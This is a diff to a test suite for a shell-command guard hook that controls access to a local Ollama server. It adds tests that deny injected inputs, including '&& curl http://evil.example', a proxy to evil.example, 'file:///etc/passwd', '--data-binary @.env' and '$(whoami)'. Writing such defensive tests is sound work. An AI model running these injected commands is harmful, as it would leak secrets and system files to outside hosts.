@@ -61,30 +61,30 @@ test("Bash command containing 'ollama' only as a substring of another word -> pa
   assertPass(bash("echo ollamafoo"));
 });
 
-// --- The one safe shape: exactly one allowed URL, no dangerous flags/operators ---
+// --- Raw HTTP commands and direct CLI generation are denied ---
 
-test("curl to 127.0.0.1:11434/api/generate with -d -> pass", () => {
-  assertPass(bash(`curl http://127.0.0.1:11434/api/generate -d '{"model":"qwen2.5-coder:7b","prompt":"hi","stream":false}'`));
+test("curl to 127.0.0.1:11434/api/generate with -d -> deny", () => {
+  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate -d '{"model":"qwen2.5-coder:7b","prompt":"hi","stream":false}'`));
 });
 
-test("curl to localhost:11434/api/generate with -s -H -d -> pass", () => {
-  assertPass(bash(`curl -s http://localhost:11434/api/generate -H "Content-Type: application/json" -d '{"stream":false}'`));
+test("curl to localhost:11434/api/generate with -s -H -d -> deny", () => {
+  assertDenied(bash(`curl -s http://localhost:11434/api/generate -H "Content-Type: application/json" -d '{"stream":false}'`));
 });
 
-test("PowerShell literal 'curl' alias, safe shape -> pass", () => {
-  assertPass(powershell(`curl http://127.0.0.1:11434/api/generate -d '{"stream":false}'`));
+test("PowerShell literal 'curl' alias, safe shape -> deny", () => {
+  assertDenied(powershell(`curl http://127.0.0.1:11434/api/generate -d '{"stream":false}'`));
 });
 
-test("Invoke-RestMethod, URI as first positional arg -> pass", () => {
-  assertPass(powershell(`Invoke-RestMethod http://127.0.0.1:11434/api/generate -Method Post -Body $body`));
+test("Invoke-RestMethod, URI as first positional arg -> deny", () => {
+  assertDenied(powershell(`Invoke-RestMethod http://127.0.0.1:11434/api/generate -Method Post -Body $body`));
 });
 
-test("Invoke-WebRequest, URI as first positional arg -> pass", () => {
-  assertPass(powershell(`Invoke-WebRequest http://localhost:11434/api/generate -Method Post -Body $body`));
+test("Invoke-WebRequest, URI as first positional arg -> deny", () => {
+  assertDenied(powershell(`Invoke-WebRequest http://localhost:11434/api/generate -Method Post -Body $body`));
 });
 
-test("ollama run CLI, no URL -> pass", () => {
-  assertPass(bash(`ollama run qwen2.5-coder:7b "reply with OK"`));
+test("ollama run CLI, no URL -> deny", () => {
+  assertDenied(bash(`ollama run qwen2.5-coder:7b "reply with OK"`));
 });
 
 test("ollama list -> pass", () => {
@@ -185,22 +185,56 @@ test("unparseable stdin -> deny", () => {
   assertDenied("not json");
 });
 
-// --- KNOWN BLOCKED GAP (2026-11-13 review round, fix 2) -----------------------------------------
-// job-core.mjs's buildSafePermissionsSettings() now allow-lists ONLY tools/ollama-generate.mjs
-// (plus bare `ollama list`/`ollama ps`) for Ollama delegation -- every raw curl/Invoke-RestMethod/
-// Invoke-WebRequest rule was removed (see that file's OLLAMA_GENERATE_ALLOW/OLLAMA_CLI_ALLOW).
-// hooks/ollama-guard-hook.mjs was SUPPOSED to be updated in the same change to recognize
-// `node <path-to-ollama-generate.mjs> ...` as a safe shape (its command text contains "ollama",
-// so looksLikeOllamaAttempt() catches it, and without that recognition it falls through to the
-// final deny). That edit could not be made: this session's tool permissions deny Edit/Write to
-// ANY path under a `hooks/` directory (confirmed against hooks/ollama-guard-hook.mjs directly,
-// "File is in a directory that is denied by your permission settings" -- not specific to
-// ~/.claude), so the hook shipped in this PR is UNCHANGED from before this fix. The test below
-// documents the resulting (undesired) CURRENT behavior with a real assertion, rather than leaving
-// the gap undiscoverable: a job whose safe-mode settings allow the wrapper call will have it
-// DENIED by this hook before it ever reaches the static allow/deny floor. Flip this assertion
-// (assertDenied -> assertPass) once the hook can be edited to add the wrapper-call recognition
-// documented in this PR's job report.
-test("KNOWN GAP: node tools/ollama-generate.mjs ... is currently denied (hook was not updated; see PR report)", () => {
-  assertDenied(bash(`node tools/ollama-generate.mjs --model qwen2.5-coder:7b --prompt hi`));
+const helperPath = fileURLToPath(new URL("../tools/ollama-generate.mjs", import.meta.url));
+const forwardPath = helperPath.replace(/\\/g, "/");
+
+test("Ollama helper passes with the repository path in either slash spelling", () => {
+  const args = '--model qwen2.5-coder:7b --prompt "reply with OK" --system "Be brief" --format json';
+  assertPass(bash('node "' + forwardPath + '" ' + args));
+  assertPass(powershell('node "' + helperPath + '" ' + args));
+});
+
+test("Ollama helper rejects other paths, invalid arguments and shell syntax", () => {
+  const command = 'node "' + forwardPath + '"';
+  const args = '--model qwen2.5-coder:7b --prompt hi';
+  for (const invalid of [
+    'node ./tools/ollama-generate.mjs ' + args,
+    command + ' --prompt hi',
+    command + ' --model qwen2.5-coder:7b --prompt',
+    command + ' ' + args + ' --url http://evil.example',
+    command + ' ' + args + ' extra',
+    command + ' ' + args + ' && curl http://evil.example',
+    command + ' ' + args + '\nwhoami',
+    command + ' ' + args + ' > output.txt',
+    command + ' --model qwen2.5-coder:7b --prompt "$(whoami)"',
+  ]) {
+    assertDenied(bash(invalid));
+    assertDenied(powershell(invalid));
+  }
+});
+
+const endpoint = "http://127.0.0.1:11434/api/generate";
+for (const [option, suffix] of [
+  ["-ofile", "-ooutput.txt"],
+  ["--proxy", "--proxy http://evil.example"],
+  ["second file:// URL", "file:///etc/passwd"],
+  ["--data-binary @file", "--data-binary @.env"],
+]) {
+  test("curl with " + option + " -> deny", () => {
+    assertDenied(bash("curl " + endpoint + " " + suffix));
+  });
+}
+
+for (const [verb, option] of [
+  ["Invoke-RestMethod", "-InFile .env"],
+  ["Invoke-WebRequest", "-OutFile output.txt"],
+]) {
+  test(verb + " with " + option + " -> deny", () => {
+    assertDenied(powershell(verb + " " + endpoint + " " + option));
+  });
+}
+
+test("ollama ps passes, and shell syntax after an Ollama CLI call is denied", () => {
+  assertPass(powershell("ollama ps"));
+  assertDenied(powershell("ollama ps; whoami"));
 });
